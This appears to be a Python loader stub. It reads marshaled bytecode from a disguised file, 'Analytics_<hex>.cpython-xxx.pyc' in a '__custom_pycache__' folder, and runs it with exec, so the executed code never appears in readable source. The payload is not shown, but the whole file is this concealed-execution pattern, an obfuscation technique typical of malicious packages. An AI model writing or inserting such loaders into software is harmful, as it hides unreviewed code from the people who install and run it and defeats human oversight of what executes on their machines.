
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Analytics_b60159514a4b466c9755923ec646c3b4.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
